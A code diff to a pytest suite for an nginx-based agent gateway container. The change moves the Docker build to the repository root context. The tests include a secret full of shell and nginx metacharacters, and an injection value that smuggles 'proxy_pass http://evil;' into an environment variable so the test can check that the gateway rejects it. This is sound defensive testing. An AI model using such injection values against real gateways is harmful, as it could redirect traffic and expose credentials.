@@ -6,7 +6,6 @@ RUN_AGENT_GATEWAY_TESTS=1 python -m pytest agent-gateway/tests
 import json
 import os
 import re
-import shutil
 import subprocess
 import time
 import uuid
@@ -23,15 +22,6 @@ def docker(*args):
     return subprocess.check_output(["docker", *args], text=True).strip()
 
 
-CONTEXT_FILES = (
-    "Dockerfile",
-    "nginx.conf",
-    "internal-secret.envsh",
-    "select-model-gateway.sh",
-    "remote-model-gateway.conf.template",
-    "remote-model-proxy.conf.template",
-)
-
 SECRET = "test-internal-secret"
 # Every character with a meaning in an nginx configuration or a shell.
 HOSTILE_SECRET = 'a")(b!c]#d\\"(e@\\f[g.h!i^j[k\'l`m$n${o};p{q}r s'
@@ -46,11 +36,7 @@ def authorizations(upstream):
 def gateway(tmp_path, request):
     config_override = getattr(request, "param", SECRET)
     secret, mode = config_override if isinstance(config_override, tuple) else (config_override, "local")
-    root = Path(__file__).resolve().parents[1]
-    context = tmp_path / "context" / "agent-gateway"
-    context.mkdir(parents=True)
-    for name in CONTEXT_FILES:
-        shutil.copyfile(root / name, context / name)
+    root = Path(__file__).resolve().parents[2]
     identity = "agent-gateway-test-" + uuid.uuid4().hex[:12]
     upstream, proxy = identity + "-upstream", identity + "-proxy"
     config = tmp_path / "upstream.conf"
@@ -80,7 +66,8 @@ def gateway(tmp_path, request):
                          "tag":"$http_x_logos_client_tag"}';
         }
     }""")
-    docker("build", "-q", "-t", identity, "-f", str(context / "Dockerfile"), str(context.parent))
+    # Use the published image's root context and allowlist, not an unfiltered hand-made context.
+    docker("build", "-q", "-t", identity, "-f", str(root / "agent-gateway/Dockerfile"), str(root))
     docker("network", "create", identity)
     try:
         docker(
@@ -176,14 +163,11 @@ def test_gateway_sends_a_secret_with_configuration_syntax_unchanged(gateway):
     assert authorizations(upstream) == ["Bearer " + HOSTILE_SECRET]
 
 
-def test_gateway_refuses_a_secret_that_is_not_one_line_of_printable_ascii(tmp_path):
-    root = Path(__file__).resolve().parents[1]
-    context = tmp_path / "context" / "agent-gateway"
-    context.mkdir(parents=True)
-    for name in CONTEXT_FILES:
-        shutil.copyfile(root / name, context / name)
+def test_gateway_refuses_a_secret_that_is_not_one_line_of_printable_ascii():
+    root = Path(__file__).resolve().parents[2]
     identity = "agent-gateway-test-" + uuid.uuid4().hex[:12]
-    docker("build", "-q", "-t", identity, "-f", str(context / "Dockerfile"), str(context.parent))
+    # Use the published image's root context and allowlist, not an unfiltered hand-made context.
+    docker("build", "-q", "-t", identity, "-f", str(root / "agent-gateway/Dockerfile"), str(root))
     try:
         run = subprocess.run(
             ["docker", "run", "--rm", "-e", "LOGOS_INTERNAL_SECRET=a\nproxy_pass http://evil;", identity],
